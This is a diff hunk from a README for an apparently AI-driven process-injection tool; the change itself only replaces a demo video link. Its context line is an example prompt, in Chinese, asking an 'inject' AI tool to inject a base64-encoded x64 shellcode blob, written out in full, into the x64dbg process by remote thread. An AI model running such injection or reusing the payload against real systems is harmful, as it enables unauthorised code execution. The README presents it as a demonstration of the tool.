@@ -40,7 +40,7 @@
 使用inject这个AI工具向名称为 x64dbg 的进程使用 远程线程 方法注入Shellcode：SDH/SPfnZUiLWGBIi1sYSItbIEiLG0iLG0iLWyBJidiLWzxMAcNIMclmgcH/iEjB6QiLFAtMAcJNMdJEi1IcTQHCTTHbRItaIE0Bw00x5ESLYiRNAcTrMltZSDHASIniUUiLDCRIMf9BizyDTAHHSInW86Z0BUj/wOvmWWZBiwREQYsEgkwBwFPDSDHJgMEHSLgPqJaRuoeanEj30EjB6AhQUeiw////SYnGSDHJSPfhUEi4nJ6TnNGah5pI99BQSInhSP/CSIPsIEH/1g==
 ```
 
-![Demo](./README.assets/2025-04-06 15-17-21.mp4)
+https://github.com/user-attachments/assets/c5301f04-86e0-49db-a08e-5e729942af9c
 
 # TODO
 
